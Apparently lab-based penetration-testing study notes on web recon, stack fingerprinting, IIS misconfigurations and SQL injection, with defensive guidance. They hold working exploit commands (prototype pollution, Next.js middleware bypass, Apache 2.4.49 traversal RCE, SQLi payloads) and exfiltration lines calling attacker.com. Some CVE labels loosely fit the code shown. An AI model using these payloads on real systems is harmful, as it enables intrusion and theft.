# Web Content Discovery & Reconnaissance

## Overview

Content discovery is one of the most critical phases of web application reconnaissance. This note covers a comprehensive workflow combining **Manual Analysis**, **Open-Source Intelligence (OSINT)**, and **Automated Enumeration** to effectively map an application's attack surface and locate hidden entry points.

---

##  1. Manual Analysis Techniques

Before launching disruptive automated scans, examine resources exposed by convention or default behaviors to uncover sensitive infrastructure clues.

### Conventional Files

* **`robots.txt`**: Used to guide search engine crawlers on what paths *not* to index. It frequently exposes sensitive administrative or staging paths (e.g., `/staff-portal`), serving as a ready-made list of targets. It is a guideline for bots, not a security control.
* **`sitemap.xml`**: Lists endpoints the site owner explicitly wants indexed. It often inadvertently exposes staging pages, old content, or hidden endpoints containing vulnerable URL parameters (e.g., `/s3cr3t-area`, `/news/article?id=1`).

### Technical Indicators & Infrastructure Stack

* **HTTP Headers**: Web server responses often include headers revealing software types and back-end languages:
* `Server: nginx/1.18.0 (Ubuntu)` (Discloses specific OS and server versions).
* `X-Powered-By: THM-Framework` (Exposes development frameworks).
* *Note:* Custom debug flags or headers (e.g., `X-FLAG`) may also be leaked.


* **Framework Documentation**: Inspecting page source comments and copyright notices helps identify the underlying framework. Reviewing that framework's public documentation often exposes default administration directories, asset paths, and default credentials (e.g., `admin / admin`).

---

### 2. Open-Source Intelligence (OSINT)

OSINT techniques collect public information from third-party tools and platforms without interacting directly with the target infrastructure.

* **Google Hacking / Dorking**: Leveraging advanced operators to surface indexed vulnerabilities or exposed data.

| Filter | Example | Description |
| --- | --- | --- |
| `site:` | `site:example.thm` | Restricts results strictly to the target domain. |
| `inurl:` | `inurl:admin` | Restricts results to URLs containing the specified string. |
| `filetype:` | `filetype:pdf` | Filters by file extension (e.g., `pdf`, `log`, `env`, `conf`). |
| `intitle:` | `intitle:login` | Filters by strings found in the page title. |
| `intext:` | `intext:password` | Searches for explicit strings within the body content. |
| `cache:` | `cache:example.thm` | Views Google's cached snapshot of a historical version of the page. |

* **Wappalyzer**: A browser extension that fingerprints CMS platforms, programming languages, web servers, framework versions, and integrated payment processors on active page load.
* **Wayback Machine**: A digital archive capturing historical snapshots of websites. Useful for extracting legacy codebases, retired endpoints, forgotten API parameters, or temporary administrative pages.
* **GitHub Reconnaissance**: Explicit public repository searches for the target company name or domain. Reviewing public source trees—and critically, the **git commit history**—frequently yields accidentally committed hardcoded API keys, configuration files, and `.env` credentials.
* **S3 Buckets**: Public cloud storage endpoints formatted as `https://{name}.s3.amazonaws.com`. Permissive access controls on common naming schemes (e.g., `{company}-backup`, `{company}-assets`) often allow unauthenticated data exfiltration.

---

##  3. Automated Discovery via Gobuster

Manual and OSINT steps are bounded by visibility constraints. Automated tools rapidly brute-force directories, files, DNS records, and server blocks using defined wordlists (such as SecLists' `common.txt` or `directory-list-2.3-medium.txt`).

### Global Flag Control

* `-t / --threads`: Sets concurrent connections (Default: 10). Increase to scale speed.
* `-w / --wordlist`: Path to target directory or subdomain wordlist.
* `-o / --output`: Saves console findings directly to a text file.
* `--delay`: Time interval between requests (Used to bypass local rate limits).

### Execution Modes

#### A. Directory Mode (`dir`)

Brute-forces paths on a web server directly to locate files and folders.

```bash
gobuster dir -u "http://10.146.134.237" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -x .php,.txt,.log -s 200,301,302

```

* Useful Modifiers:
* `-x`: Appends specific extensions to every item in the wordlist (e.g., `-x .php,.json`).
* `-r / --followredirect`: Instructs Gobuster to follow HTTP redirects (Status 3xx).
* `-s / --status-codes`: Restricts output display to specific status returns (e.g., `200 OK`).



#### B. DNS Mode (`dns`)

Queries subdomains using traditional DNS lookups. Essential because secondary subdomains often run older, unpatched service code.

```bash
gobuster dns -d example.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --wildcard

```

* Useful Modifiers:
* `--wildcard`: Forces continuous discovery even if a wildcard DNS record exists.
* `-i / --show-ips`: Displays resolved target IP addresses beside identified subdomains.



#### C. Virtual Host Mode (`vhost`)

Unlike DNS mode, `vhost` mode connects directly to the target IP address and cycles through wordlist terms inside the **`Host:` HTTP Header**. This uncovers internal web configurations that are not declared in public DNS records.

```bash
gobuster vhost -u "http://10.146.134.237" --domain example.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain --exclude-length 250-320

```

* Useful Modifiers:
* `--append-domain`: Combines the wordlist string directly with the base domain name.
* `--exclude-length`: Filters out false positives that generate uniform response body sizes.



---

##  Summary Reconnaissance Framework

| Method | Focus | Key Targets |
| --- | --- | --- |
| **Manual** | Quick Wins & Internal Logic | `robots.txt`, `sitemap.xml`, Source Comments, HTTP Headers |
| **OSINT** | Public Information Leaks | Google Dorks, Wayback Machine, GitHub Commits, S3 Buckets |
| **Automated** | Complete Attack Surface Mapping | Gobuster (`dir` paths, `dns` subdomains, `vhost` configurations) |

--------

# Web Stack Fingerprinting & Target Exploitation Guide

## Overview

Passive stack fingerprinting analyzes raw HTTP response signals—such as custom headers, cookie naming conventions, error page formats, and HTML source patterns—without transmitting malicious exploit payloads.

Accurately fingerprinting the specific technology stack and version number immediately reveals the exact attack surface and applicable Common Vulnerabilities and Exposures (CVEs), significantly increasing exploitation speed during time-boxed engagements.

---

## 🛠️ Web Stack Fingerprinting Reference

| Target Port / Stack | Key Passive Signal | Value / Specific Pattern | Confidence | Strategic Notes |
| --- | --- | --- | --- | --- |
| **Port 3000**<br>

<br>MERN Stack | `X-Powered-By` Header | `Express` | **High** | Primary signal; absent only if explicitly disabled via code or stripped by a reverse proxy (e.g., Nginx, Vercel). |
|  | `Set-Cookie` Header | `connect.sid=s%3A...` | **High** | Originated by `express-session` middleware. May be absent on unauthenticated requests if `saveUninitialized: false`. |
|  | Unhandled Route | Plain text: `Cannot GET /path` | **High** | Distinctive default plain-text string; differs completely from styled framework error pages. |
| **Port 3001**<br>

<br>Next.js | `X-Powered-By` Header | `Next.js` | **High** | Framework-specific banner. |
|  | HTML Source | `window.__next_f` inside a `<script>` tag | **High** | The definitive **App Router** indicator used for React Server Component data hydration. |
|  | Custom Headers | `x-nextjs-cache: HIT`, `x-nextjs-prerender: 1` | **High** | Confirms the application is running a compiled production build. |
| **Port 8000**<br>

<br>Django | `Server` Header | `WSGIServer/0.2 CPython/X.X.X` | **High** | Django-specific development/WSGI server banner. |
|  | HTML Source Forms | Name attribute: `csrfmiddlewaretoken` | **High** | Injected automatically into all POST forms by `CsrfViewMiddleware`. |
|  | Security Headers | `X-Frame-Options: DENY`<br>

<br>`X-Content-Type-Options: nosniff`<br>

<br>`Referrer-Policy: same-origin` | **High** | Applied simultaneously by default via Django's `SecurityMiddleware`. |
| **Port 8080**<br>

<br>LAMP (Apache) | `Server` Header | `Apache/2.4.49 (Unix)` | **High** | Direct, exact version match pointing to severe, unpatched critical vulnerabilities. |
|  | Directory Probing | `/cgi-bin/` returning `403 Forbidden` | **High** | Confirms the target directory exists and `mod_cgi` is actively enabled. |

---

## 🤖 Automated Scanner Fingerprint Auditing (Nikto)

While manual fingerprinting is foundational, scanning broad scopes requires efficient prioritization. **Nikto** provides a rapid first pass—probing each service, parsing HTTP banners, and surfacing architectural misconfigurations or known missing security headers without deploying intrusive exploits.

```bash
# General Target Syntax Usage
nikto -h http://MACHINE_IP:PORT

```

### 📋 Port-by-Port Analysis

#### 🟢 Port 3000: MERN Stack

* **Key Signals:** Detects `X-Powered-By: Express` and the session tracker cookie signature `connect.sid`.
* **Security Deficiencies:** Flags when the `connect.sid` cookie lacks the `HttpOnly` security attribute and notices the absence of anti-clickjacking frameworks (`X-Frame-Options`).
* **Verdict:** Confirms the Node/Express infrastructure backend, shifting target analysis toward API endpoints.

#### 🟢 Port 3001: Next.js

* **Key Signals:** Captures `X-Powered-By: Next.js` alongside structural caching deployment headers: `x-nextjs-cache: HIT`, `x-nextjs-prerender: 1`, and `x-nextjs-stale-time`.
* **Verdict:** Verifies that the App Router is running in its compiled production build layout—the explicit prerequisite required to execute the middleware authentication bypass.

#### 🟢 Port 8000: Django

* **Key Signals:** Extracts the precise, framework-explicit software definition: `Server: WSGIServer/0.2 CPython/3.10.12`.
* **Security Indicators:** Notes active `referrer-policy: same-origin` and `x-content-type-options: nosniff` implementations.
* **Verdict:** Confirms Django's native `SecurityMiddleware` layers are active, directing attention to input parameter validation rather than generic header exploits.

#### 🟢 Port 8080: Apache LAMP

* **Key Signals:** Directly retrieves `Server: Apache/2.4.49 (Unix)`.
* **Secondary Findings:** Notes that the server leaks filesystem inodes via active `ETags` configurations and identifies that the `HTTP TRACE` protocol method is allowed (making it potentially susceptible to Cross-Site Tracing).
* **Verdict:** Provides an immediate, definitive confirmation of an exploitable version match for CVE-2021-41773.

> 📝 **Strategic Assessment:** Nikto maps out broad application footprints in seconds, exposing low-level system banners like Apache's exact software build. However, automated vulnerability tools lack context for application-level logical flaws, such as dynamic object handling or custom ORM queries. This is the precise boundary where manual verification frameworks take over.

---

## ⚡ Exploitation Walkthroughs & Deep Dives

### 1. MERN Stack: Prototype Pollution to Auth Bypass (CVE-2020-8203)

When a dynamic JavaScript utility function blindly merges user-controlled JSON data into a target server-side object without validation, it creates an attack surface for prototype pollution.

#### Vulnerable Code Pattern

```javascript
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]); // Dangerous deep recursion
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

```

#### Exploit Execution

When the application processes the target JSON payload, the recursive merge function maps the keys onto the global root object constructor. This globally injects the property `isAdmin: true` into the global `Object.prototype` layer inside the Node.js runtime environment.

1. **Inject the Payload:**
```bash
curl -b cookies.txt -X POST http://MACHINE_IP:3000/api/user/update \
     -H "Content-Type: application/json" \
     -d '{"__proto__": {"isAdmin": true}}'

```


2. **Access the Flag Endpoint:**
```bash
curl -b cookies.txt http://MACHINE_IP:3000/api/admin/flag

```


*Result:* Because the authorization endpoint validates `currentUser.isAdmin`, the validation check traverses upward along the modified prototype chain, resolves to `true`, and prints the flag.

---

### 2. Next.js: Middleware Authentication Bypass (CVE-2025-29927)

Next.js production applications utilize internal subrequest tracking headers to ensure recursive middleware executions do not induce localized processing loops.

#### Root Cause

Next.js fails to establish origin validation checks on incoming `x-middleware-subrequest` headers. When an external client presents this header manually, the framework falsely categorizes the request as a trusted internal subrequest and skips the middleware authentication gate entirely.

#### Exploit Execution

To bypass authentication checks and force direct routing to the server-side logic of a restricted `/dashboard` pathway, pass the module path string repeated five times:

```bash
curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" http://MACHINE_IP:3001/dashboard

```

> 💡 **Tip:** If the target application deploys a `/src` directory architecture layout, adapt the payload construction to target the source folder pathway:
> `src/middleware:src/middleware:src/middleware:src/middleware:src/middleware`

---

### 3. Django: Error-Based SQL Injection (CVE-2021-35042)

This vulnerability occurs when an application bypasses standard Object-Relational Mapping (ORM) safe parameter limits or passes unvalidated parameters directly into underlying query manipulation functions like `.order_by()`.

#### Vulnerable Code Pattern

```python
order = self.request.GET.get('order', 'name')
sql = (
    'SELECT id, name, price, description FROM products_product '
    f'ORDER BY (CASE WHEN (1=1) THEN {order} ELSE name END)')

```

#### Exploit Execution

Because the parameter is directly concatenated, we can use an error-based SQL injection payload targeting the underlying MySQL database engine. By inserting `updatexml()`, we intentionally trigger an internal XPath validation error containing our query results. This error is displayed on-screen if Django's default `DEBUG = True` mode is enabled.

1. **Extract Database Version & Verify Vulnerability:**
```bash
curl -s "http://MACHINE_IP:8000/products/?order=updatexml(1,concat(0x7e,(select%20@@version)),1)" | grep -o '~[0-9][^&]*'

```


2. **Extract Active Database Name:**
```bash
curl -s "http://MACHINE_IP:8000/products/?order=updatexml(1,concat(0x7e,(select%20database())),1)" | grep -o '~[0-9a-zA-Z_][^&]*'

```



---

### 4. Apache 2.4.49: Path Traversal & RCE (CVE-2021-41773)

A flaw within Apache version 2.4.49's path normalization engine (`ap_normalize_path()`) mistakenly validates path characters *before* parsing URL-encoded elements, making it possible to bypass standard directory traversal path restrictions.

#### Root Cause

The traversal filter fails to recognize the URL-encoded sequence `.%2e/` as a directory traversal (`../`) attempt. When the request is later passed down to the file system layer, the operating system decodes and resolves the path, allowing an attacker to break out of the defined web root.

#### Exploit Execution

When combined with a functional `/cgi-bin/` configuration layout running `mod_cgi`, the directory traversal bypass can point to system binaries (like `/bin/sh`), allowing for unauthenticated Remote Code Execution (RCE).

```bash
curl -s --path-as-is "http://MACHINE_IP:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
     --data 'echo Content-Type: text/plain; echo; id; cat /flag.txt'

```

> ⚠️ **CRITICAL:** The `--path-as-is` parameter is mandatory. Without it, the local client shell environment automatically sanitizes the path sequence prior to network transmission, neutralizing the traversal attempt before it reaches the target server.

---

## 🎯 Master Target Vulnerability Mapping Matrix

Every technology stack inherently leaks its core composition signals. By aligning automated visibility, passive observation patterns, and precise exploit validation strategies, operators can rapidly map vulnerabilities to corresponding technical targets:

| Architecture Stack | Primary Passive Signals | Target Exploit Mechanism | CVE ID Reference | Impact Classification | CVSS Base Score |
| --- | --- | --- | --- | --- | --- |
| **MERN / Express** | `X-Powered-By: Express`<br>

<br>`Set-Cookie: connect.sid` | Object runtime constructor manipulation via unfiltered deep parsing loops. | **CVE-2020-8203** | Prototype Pollution ➡️ Administrative Bypass | **7.4 High** |
| **Next.js App Router** | `X-Powered-By: Next.js`<br>

<br>`window.__next_f` script tags | Unauthenticated spoofing of internal `x-middleware-subrequest` processing routing indicators. | **CVE-2025-29927** | Authentication Bypass ➡️ Sensitive Information Leakage | **9.1 Critical** |
| **Django App Stack** | `Server: WSGIServer`<br>

<br>Injected `csrfmiddlewaretoken` fields | Direct input string concatenation intersecting unparameterized SQL `.order_by()` methods. | **CVE-2021-35042** | Error-Based XPath String Data Exfiltration | **9.8 Critical** |
| **LAMP / Apache Server** | `Server: Apache/2.4.49`<br>

<br>Accessible `/cgi-bin/` directories | Normalization processing flaws misinterpreting `.%2e/` sequences before URL decoding occurs. | **CVE-2021-41773** | Path Traversal ➡️ Unauthenticated Remote Code Execution (RCE) | **9.8 Critical** |

---

This text covers the fundamental phase of offensive security and penetration testing: **Infrastructure & Web Server Fingerprinting**.

Before attempting complex exploits, an operator must identify the underlying server software and version. This blueprint details exactly how different servers reveal their identities and how specific architectural misconfigurations can be targeted to leak critical information.

Here is a broken-down, organized breakdown of these four distinct web servers to add to your reference notes.

---

## 🛠️ Web Server Fingerprinting Cheat Sheet

When analyzing an unknown target IP address, the **combination of HTTP headers and 404 error layouts** yields an unambiguous identification of the backend technology layer.

| Target Port / Service | Primary Header Signal | Secondary/Backup Signal | Default 404 Error Behavior |
| --- | --- | --- | --- |
| **Port 80**<br>

<br>Apache2 | `Server: Apache/2.4.x (Ubuntu)` | Inode leaks via `ETag` headers | Contains the server name (`Apache`) inside the response body text. |
| **Port 8000**<br>

<br>Python HTTP Server | `Server: SimpleHTTP/0.6 Python/3.x` | *None* (No authentication or logging config) | Returns raw, plain-text indicators. |
| **Port 3000**<br>

<br>Node.js Express | *None* (Server header is blank by default) | framework signature: `X-Powered-By: Express` | Returns unformatted text: `Cannot GET /path`. |
| **Port 8080**<br>

<br>Nginx | `Server: nginx/1.xx.x` | Active proxy forwarding signals | Automatically lists the explicit framework version in the HTML footer. |

---

## 🐍 1. Python Built-In HTTP Server (`http.server`)

Developers frequently launch this built-in utility via the terminal command `python3 -m http.server 8000` to quickly share files or transfer data between machines.

### ⚠️ Critical Flaws & Exposure Vectors

* **Universal Document Exposure:** Python has no access control lists or `.htaccess` protection structures. It exposes the **entire folder directory** from which the command was initiated.
* **Dotfile Leaks:** Unlike enterprise web servers, Python fully exposes hidden dotfiles, which routinely contain sensitive environmental parameters:
```bash
curl -s http://TARGET_IP:8000/.env
# Exposes: SECRET_KEY, DATABASE_URL, and plaintext system passwords

```


* **Archive Exposures:** It automatically displays index directory listings if an `index.html` file is absent. If an old backup file (e.g., `backup.zip`, `db_dump.sql`) sits in that folder, it can be downloaded directly:
```bash
curl -s http://TARGET_IP:8000/backup.zip -o backup.zip

```



---

## 🦅 2. Apache2 Web Server

Apache is widely deployed, but its default Ubuntu layout leaves several verbose informational metrics wide open unless it is explicitly hardened.

### ⚠️ Critical Flaws & Exposure Vectors

* **`Options +Indexes` (Directory Listing):** If no landing index file is found in a directory pathway (like `/files/`), Apache lists every file, file size, and timestamp on an unauthenticated index page.
* **Exposed `mod_status` Boundary (`/server-status`):** This internal module monitors server performance metrics. If configured with a weak `Require all granted` directive, anyone can access `/server-status` to view active connections, worker states, and real-time internal subrequest path strings.
* **Unlinked File Vulnerabilities:** Developers frequently store configurations or backups in the web root without linking them. These can be easily mapped out using automated path-fuzzing utilities like **Gobuster**:
```bash
gobuster dir -u http://TARGET_IP:80 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -x bak,txt,html

```


> 📝 **High-Value Target:** Finding exposed `.bak` configurations or `.htpasswd` basic authentication password hash lists lets you pivot to offline password-cracking attacks.



---

## 🟢 3. Node.js (Express Framework)

Express handles requests entirely via application source code rather than serving files out of a static physical folder root.

### ⚠️ Critical Flaws & Exposure Vectors

* **Custom Error Handling & Stack Trace Leaks:** If developers misconfigure `NODE_ENV=development` or implement a loose custom error catcher, sending malformed inputs to an API endpoint (like `/api/users`) can trigger an unhandled crash. The server response then leaks full server-side stack traces, uncovering internal folder structures, library versions, and raw database queries.
* **Exposed Route Directories (`/api/routes`):** Developers sometimes export internal routing stacks (`app._router.stack`) to check active endpoints during development. If left online, an attacker can read the entire valid API surface map instantly, skipping directory-guessing tools entirely.
* **Exposed Environment Arrays (`/api/debug/env`):** Loose debugging endpoints that dump `process.env` directly expose the runtime's internal database passwords, session secret keys, and API tokens.
* **`express.static()` Dotfile Behavior:** By default, Express's static asset middleware blocks requests for dotfiles (returning a `404 Not Found`). If a `.env` file exists, it must be retrieved via an alternate logic flaw or shell access.

---

## 🔴 4. Nginx Server & Reverse Proxy

Nginx is primarily used to handle heavy asset routing or to act as a secure boundary gateway in front of internal Node.js or Python backend servers.

### ⚠️ Critical Flaws & Exposure Vectors

* **`server_tokens` Version Leakage:** By default, `server_tokens on` leaks the exact software patch version in both the `Server` header and default error pages. Turning it off (`server_tokens off`) suppresses the version in both places simultaneously.
* **`autoindex on` Exposure:** When a location block includes `autoindex on`, Nginx generates a clean index structure mapping file deployment details, which can leak configuration files like `server-config.txt` or `deploy-notes.txt`.
* **Exposed `stub_status` Metric Paths (`/nginx_status`):** If the server includes an unprotected `allow all` statement inside the `/nginx_status` block, any external IP can view active server metrics, concurrent connection tallies, and traffic spikes.

---

## 🛡️ The Global Baselines: Security Headers

Security headers must be actively configured; **no web server enables them by default**. Checking for their presence across all target ports highlights general hardening gaps across the perimeter:

```bash
# Rapid programmatic verification loop targeting multi-port perimeters
for port in 80 8000 3000 8080; do 
  echo "=== Port $port ==="
  curl -sI http://TARGET_IP:$port/ | grep -iE "x-frame-options|x-content-type|content-security-policy|referrer-policy" || echo "(No security headers found)"
done

```

### 📋 Core Security Headers Reference Table

* **`X-Frame-Options: DENY`** ➡️ Prevents the page from being rendered inside an external iframe, completely stopping UI Redressing/Clickjacking attacks.
* **`X-Content-Type-Options: nosniff`** ➡️ Forces the browser to strictly follow the declared `Content-Type` header, stopping dangerous MIME-sniffing and cross-site scripting (XSS) vectors.
* **`Content-Security-Policy (CSP)`** ➡️ Establishes a strict safelist defining exactly where scripts, styles, and assets can load from.
* **`Referrer-Policy: same-origin`** ➡️ Restricts the browser from leaking sensitive internal query paths inside the `Referer` header when navigating to outside domains.

  ---

  # IIS 


This final section transitions from targeted feature exploitation to broad **Attack Surface Analysis** and **Scan Automation**.

IIS penetration testing study notes.

---

## 📑 Part 1: High-Severity IIS Misconfigurations

Unlike code vulnerabilities, these vulnerabilities exist because a feature works *exactly as configured*, but has been deployed insecurely.

### 1. `web.config` Cleartext Exposure

* **What it is:** The central administrative blueprint file for ASP.NET applications. It houses critical back-end settings, core parameters, and environment overrides.
* **The Risk:** If an administrator incorrectly alters or removes IIS's native request-filtering rule blocks, an attacker can download this file via a standard request:
```bash
curl http://MACHINE_IP/web.config

```


* **Impact:** High Severity. It routinely leaks plaintext **database connection strings**, internal SQL admin passwords, API session keys, and custom encryption salt values.

### 2. Verbose Error Pages & Application Stack Traces

* **What it is:** When an application throws an error and the configuration parameter `<customErrors mode="Off" />` is set within `web.config`.
* **The Risk:** Any raw server-side runtime crash dumps a detailed graphical summary to remote clients rather than a safe, generic `500 Internal Error` notification page.
* **Impact:** Leaks highly granular code paths (e.g., `C:\inetpub\wwwroot\App\Controllers\...`), the exact .NET compilation assembly build, underlying database queries, and internal system variables.

### 3. Exposed Diagnostic Tracing (`trace.axd`)

* **What it is:** A native diagnostic tool designed to record application logs during active troubleshooting workflows.
* **The Risk:** If `<trace enabled="true"/>` is accidentally pushed to a production environment without a local-loopback restriction, any visitor can open the panel at `/trace.axd`.
* **Impact:** The engine exposes a real-time historical buffer of the last 50 incoming requests—including **live session cookies**, authentication tokens, and user inputs—allowing an operator to instantly hijack active user sessions.

### 4. Global Insecure Method Exposure (`PUT` / `DELETE` / `TRACE`)

* **Directory Listing Enabled:** If a folder lacks a default landing page (like `index.html` or `default.aspx`) and directory browsing is toggled on, IIS lists the file hierarchy. This allows attackers to find and extract left-behind files (like `/uploads/config.bak` or `web.config`).
* **Global WebDAV:** If WebDAV verbs (`PUT`, `DELETE`) are enabled globally rather than restricted to a specific path, any folder path on the perimeter can become a target for unauthorized file uploads.
* **HTTP TRACE Method:** Actively echoing an incoming HTTP request back to a client can facilitate Cross-Site Tracing (XST) vectors on legacy clients. A hardened server should return a `405 Method Not Allowed` response instead.

---

## 🛠️ Part 2: Automating IIS Reconnaissance with Nmap

Instead of executing tedious individual manual diagnostic queries using `curl`, the **Nmap Scripting Engine (NSE)** can programmatically map out the entire structural posture of an IIS perimeter in a single automated pass.

```bash
# Complete Automated IIS Verification Sweep
nmap -p 80 --script http-methods,http-webdav-scan,http-ntlm-info --script-args http-ntlm-info.root=/webdav/ MACHINE_IP

```

### 🔍 Breakdown of Key Automated NSE Scripts:

#### 🔹 `http-methods`

* **Execution Goal:** Automatically fires an `OPTIONS` probe against the target root path and evaluates the returned `Allow:` response headers.
* **Security Insight:** Instantly highlights risky verbs like `PUT`, `DELETE`, or `TRACE`. If these appear at the root level (`/`), it alerts you that WebDAV or risky file modifications are active globally across the site.

#### 🔹 `http-webdav-scan`

* **Execution Goal:** Targets specific directory boundaries with a `PROPFIND` request to look for extended WebDAV properties.
* **Security Insight:** Even if Nmap reports the WebDAV type as "Unknown," a return listing custom verbs like `PROPPATCH`, `MKCOL`, `LOCK`, or `UNLOCK` leaves no ambiguity that WebDAV is active and ready to be tested for write access.

#### 🔹 `http-ntlm-info`

* **Execution Goal:** Injects an unauthenticated request into a protected path to force the server to respond with a Windows NTLM challenge handshake.
* **Security Insight:** Parses the base64 encoded challenge response to leak internal infrastructure data without needing credentials, uncovering properties such as:
* `Target_Name` / `NetBIOS_Computer_Name` (Internal Hostname)
* `Product_Version` (e.g., `10.0.17763`, which explicitly maps to a Windows Server 2019 build)



---

## 🏁 Summary Checklist: The Complete IIS Attack Chain

When auditing a target running an IIS environment, structure your attack plan using this logical workflow:

```
[Phase 1: Fingerprint] ──> Identify version via Server headers or Nmap http-ntlm-info.
          │
[Phase 2: Enumerate]   ──> Run iis_shortname_scan.py to find hidden 8.3 folders (~1).
          │
[Phase 3: Inspect]     ──> Check for exposed web.config, trace.axd, or leaked backups (.bak).
          │
[Phase 4: Weaponize]   ──> Locate WebDAV directories, upload an ASPX shell via NTLM auth.
          │
[Phase 5: Escalate]    ──> Identify SeImpersonatePrivilege and use Potato exploits for SYSTEM.

```


 **SQL Injection (SQLi) Design & Methodology**

---

# 🗄️ SQL Injection (SQLi) Design & Methodology

## 1. The SQLi Building Blocks

To manipulate a query, you must understand the relational database behaviors that allow payloads to execute cleanly without throwing syntax errors.

### 🔹 SQL Comments

Instructs the database engine to drop trailing query characters. MySQL uses `-- ` (double dash followed by a space) or `#`. Multi-line comments use `/* ... */`.

* **Vulnerability Role:** Truncates leftover logic (like password verifications) that would otherwise break payload syntax.

### 🔹 The `UNION` Operator

Combines the result sets of two or more `SELECT` statements into a single response.

* **The Rule:** Both queries must return the **exact same number of columns**, and their data types must be compatible.

### 🔹 Wildcards (`LIKE`) & Limits (`LIMIT`)

* **`LIKE 'adm%'`:** The `%` wildcard matches any sequence, allowing attackers to guess strings character-by-character in blind attacks.
* **`LIMIT offset, count`:** Restricts row counts to ensure data dumps fit neatly into the application's visual fields (e.g., `LIMIT 2, 1` skips two rows and returns the third).

### 🔹 `information_schema` (The Database Map)

The built-in metadata catalog for MySQL, MariaDB, and PostgreSQL.

* **`information_schema.tables`:** Maps out tables via `table_name` and `table_schema`.
* **`information_schema.columns`:** Discovers the precise column labels inside target tables.

---

## 2. In-Band SQL Injection (Direct Visibility)

Data is extracted using the exact same network channel used to inject the payload. The results appear explicitly within the HTML text or application response.

### A. Error-Based SQLi

Exploits verbose database error strings displayed directly on the front-end interface. Triggered via characters like `'` or `"`.

> *Example error:* `"You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version..."*

### B. Union-Based SQLi (6-Step Extraction Blueprint)

1. **Find Column Count:** Inject `1 UNION SELECT 1,2,3-- ` (incrementing numbers until the page loads successfully).
2. **Make Payload Visible:** Set the original parameter ID to an invalid index (like `0` or `-1`) to force only your injected row onto the screen.
3. **Grab Active DB:** Inject `0 UNION SELECT 1,2,database()-- ` to identify the active database schema name.
4. **Enumerate Tables:** Inject `0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema='target_db'-- `
5. **Enumerate Columns:** Inject `0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='target_table'-- `
6. **Exfiltrate Records:** Inject `0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM target_table-- `

---

## 3. Blind SQL Injection (Indirect Visibility)

The web application completely suppresses database errors and query outputs. Data must be deduced through behavioral inferences.

### A. Authentication Bypass

* **Mechanism:** Subverts standard login checks that simply evaluate if a query returns a valid row.
* **Classic Payload:** Placing `' OR 1=1;-- ` in a username field alters the query:
```sql
SELECT * FROM users WHERE username='' OR 1=1;--' AND password='...';

```


* **Result:** Because `1=1` is universally true and the password check is commented out, the engine returns the first row in the table (typically the administrator account).

### B. Boolean-Based Blind SQLi

Evaluates binary state signals on the page (e.g., a response shifting from `{"taken":true}` to `{"taken":false}`).

* **Extraction Payload:** Ask targeted Yes/No questions character-by-character:
```sql
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'a%';--

```


* If the application outputs a `True` response state, the first letter is confirmed as `a`.

### C. Time-Based Blind SQLi

Utilized when the application layout remains identical regardless of query validity. Latency is the only telemetry feedback.

* **Extraction Payload:** Force the engine to execute a time delay function like `SLEEP()` if a condition is satisfied:
```sql
admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 's%';--

```


* If the server pauses its response for 5 seconds, the condition is true.

>  **Operator Note:** Network latency can cause false positives. Always use distinct sleep windows (5–10 seconds) and double-test responses. On MSSQL, use `WAITFOR DELAY '0:0:5'`.

---

## 4. Out-of-Band (OOB) SQL Injection

Forces the database server to connect out to an external server you control (via DNS or HTTP) and deliver the exfiltrated data within the request structure itself.

### A. DNS Exfiltration (MySQL on Windows)

Uses `LOAD_FILE()` to combine stolen strings as subdomains directed to an attacker's authoritative domain:

```sql
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\share'));

```

Windows attempts to resolve this UNC share path, generating an outbound DNS request for `webapp_db.attacker.com` that gets caught in the attacker's listener logs.

### B. MSSQL Injection Vectors

* **`xp_dirtree`:** Resolves UNC pathways via DNS lookups (enabled by default):
```sql
EXEC master..xp_dirtree '\\data.attacker.com\share';

```


* **`xp_cmdshell`:** Executes OS commands to push payloads outward (disabled by default):
```sql
EXEC xp_cmdshell 'nslookup data.attacker.com';

```



*Note: Subdomain labels inside DNS lookups have a hard architectural size limitation of **63 characters**.*

---

## 5. Secure Defensive Architecture

### A. Prepared Statements (Parameterized Queries)

The definitive remediation for SQLi. It compiles the query structure statically with placeholders *before* receiving user input. Input is handled strictly as data parameters, never as executable code.

* **Vulnerable Implementation (String Concatenation):**
```php
$query = "SELECT * FROM users WHERE username='" . $_POST['username'] . "'";

```


* **Secure Engineering (Parameterized Binding via PHP PDO):**
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$_POST['username']]);

```



### B. Defense-in-Depth Measures

* **Allowlist Input Validation:** Validate properties using precise structural constraints (e.g., verifying numerical fields using `ctype_digit()`). Avoid relying on character filters or blocklists alone, as they are easily bypassed via alternative encodings.
* **Principle of Least Privilege:** Ensure the web app connects using a tightly restricted database service account. Never connect using highly privileged accounts like `root` or `sa`.
* **Web Application Firewalls (WAFs):** Deploy as a supplementary signature inspection layer to catch and drop common exploitation payloads, but never treat them as a replacement for secure coding practices.

---

##  SQLi Operational Exploitation Cheat Sheet

```
                  ┌────────────────────────────────────────┐
                  │      SQL Injection Payload Flow        │
                  └────────────────────────────────────────┘
                                       │
         ┌─────────────────────────────┴─────────────────────────────┐
         ▼                                                           ▼
  [In-Band Methods]                                           [Blind Methods]
         │                                                           │
         ├─► Level 1: Union-Based                                    ├─► Level 2: Auth Bypass
         │   Extract via HTML output columns                         │   Force True rows via OR 1=1
         │                                                           │
         └─► Error-Based                                             ├─► Level 3: Boolean-Based
             Extract via database error logs                         │   Read true/false binary signals
                                                                     │
                                                                     └─► Level 4: Time-Based
